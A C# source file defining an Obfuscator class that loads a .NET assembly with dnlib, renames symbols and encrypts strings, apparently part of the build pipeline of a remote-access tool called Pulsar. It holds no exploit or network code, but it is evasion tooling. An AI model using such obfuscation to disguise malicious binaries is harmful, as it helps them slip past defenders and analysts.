using dnlib.DotNet;
using Pulsar.Server.Build.Obfuscator.Transformers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Server.Build.Obfuscator
{
    public class Obfuscator
    {
        private ModuleContext moduleContext;
        private ModuleDefMD module;

        public Obfuscator(string path)
        {
            moduleContext = ModuleDef.CreateModuleContext();
            module = ModuleDefMD.Load(path, moduleContext);
        }

        public Obfuscator(byte[] data)
        {
            moduleContext = ModuleDef.CreateModuleContext();
            module = ModuleDefMD.Load(data, moduleContext);
        }

        public void Save(string path)
        {
            module.Write(path);
        }

        public byte[] Save()
        {
            MemoryStream stream = new MemoryStream();
            module.Write(stream);

            long size = stream.Position;
            stream.Position = 0;
            byte[] data = new byte[size];
            stream.Read(data, 0, (int)size);


            return data;
        }

        public ModuleDefMD Module
        {
            get { return module; }
        }

        public void Obfuscate()
        {
            Console.WriteLine("Obfuscating....");
            List<ITransformer> transformers = new List<ITransformer>()
            {
                new RenamerTransformer(),
                new StringEncryptionTransformer()
            };

            foreach (ITransformer transformer in transformers)
            {
                transformer.Transform(this);
            }
        }
    }
}
